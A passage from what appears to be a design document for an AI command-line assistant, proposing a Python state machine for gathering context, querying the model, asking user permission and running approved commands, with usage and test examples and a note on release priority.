                self.state = ConversationState.ERROR
                return self._handle_error()
        
        return self.context.ai_response
    
    def _execute_current_state(self):
        """Execute logic for current state and transition."""
        
        if self.state == ConversationState.INITIALIZING:
            self._gather_context()
            self.state = ConversationState.QUERYING_AI
        
        elif self.state == ConversationState.QUERYING_AI:
            self._query_ai()
            self.state = ConversationState.STREAMING_RESPONSE
        
        elif self.state == ConversationState.STREAMING_RESPONSE:
            next_action = self._stream_response()
            
            if next_action == "needs_command":
                self.state = ConversationState.AWAITING_PERMISSION
            elif next_action == "complete":
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.AWAITING_PERMISSION:
            permission = self._request_permission()
            
            if permission == "approved":
                self.state = ConversationState.EXECUTING_COMMAND
            elif permission == "rejected":
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.EXECUTING_COMMAND:
            self._execute_command()
            
            # Check if AI needs to process output
            if self._should_continue():
                self.state = ConversationState.PROCESSING_OUTPUT
            else:
                self.state = ConversationState.RESPONDING
        
        elif self.state == ConversationState.PROCESSING_OUTPUT:
            # AI analyzes command output and decides next step
            self.state = ConversationState.QUERYING_AI  # Loop back
        
        elif self.state == ConversationState.RESPONDING:
            self._show_final_response()
            self.state = ConversationState.COMPLETE
    
    def _gather_context(self):
        """INITIALIZING state: Gather all context."""
        print("🔍 Gathering context...")
        # Collect history, git status, etc.
    
    def _query_ai(self):
        """QUERYING_AI state: Send request to AI."""
        print("🤖 Thinking...")
        # Build prompt and query AI
    
    def _stream_response(self) -> str:
        """STREAMING_RESPONSE state: Display streaming response."""
        # Stream response with thinking breadcrumbs
        return "needs_command" or "complete"
    
    def _request_permission(self) -> str:
        """AWAITING_PERMISSION state: Get user approval."""
        # Show permission prompt
        return "approved" or "rejected"
    
    def _execute_command(self):
        """EXECUTING_COMMAND state: Run approved command."""
        # Execute command and capture output
    
    def _should_continue(self) -> bool:
        """Check if AI should process output and continue."""
        return self.context.current_command_index < len(self.context.commands_to_run)
    
    def _show_final_response(self):
        """RESPONDING state: Show final message."""
        print(self.context.ai_response)
    
    def _handle_error(self) -> str:
        """ERROR state: Handle and display error."""
        return f"Error: {self.error}"
```

**Benefits:**

1. **Testability**: Each state can be tested independently
2. **Debuggability**: Always know exactly where we are
3. **Resumability**: Can save state and resume later
4. **Clarity**: Makes complex flow easier to understand
5. **Extensibility**: Easy to add new states/transitions

**Usage:**

```python
# Main CLI entry point
def main(user_query: str):
    context = ConversationContext(
        user_query=user_query,
        cwd=os.getcwd(),
        shell_history=get_shell_history(),
        git_status=get_git_status(),
    )
    
    state_machine = ConversationStateMachine(context)
    result = state_machine.run()
    
    print(result)
```

**Testing:**

```python
def test_permission_rejected():
    """Test that rejecting permission goes to RESPONDING state."""
    context = ConversationContext(...)
    sm = ConversationStateMachine(context)
    
    sm.state = ConversationState.AWAITING_PERMISSION
    # Mock user rejecting permission
    sm._execute_current_state()
    
    assert sm.state == ConversationState.RESPONDING
```

**Priority:** Medium - Add in v0.2 after core functionality is stable

**Note:** v0.1 can have simpler linear flow. State machine becomes valuable when adding features like:
- Multi-step commands with feedback loops
- Interactive debugging
- Conversation resumption
- Error recovery
